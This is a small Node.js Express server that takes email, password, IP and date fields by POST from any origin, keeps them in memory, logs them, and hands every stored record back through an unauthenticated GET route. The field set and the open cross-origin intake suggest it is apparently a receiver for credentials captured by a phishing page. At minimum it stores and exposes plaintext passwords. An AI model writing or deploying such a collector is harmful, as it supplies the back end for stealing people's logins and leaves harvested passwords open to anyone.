const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const cors = require('cors');

app.use(bodyParser.json());
app.use(cors());

let dataStore = [];

app.post('/', (req, res) => {
   const { date, ip, mail, password } = req.body;

   const data = { date, ip, mail, password };
   dataStore.push(data);

    console.log(dataStore);

   res.status(200).json({ message: 'Data received successfully' });
});

app.get('/', (req, res) => {
    res.status(200).json(dataStore);
 });

app.listen(3000, () => {
   console.log('Server is running on http://localhost:3000');
});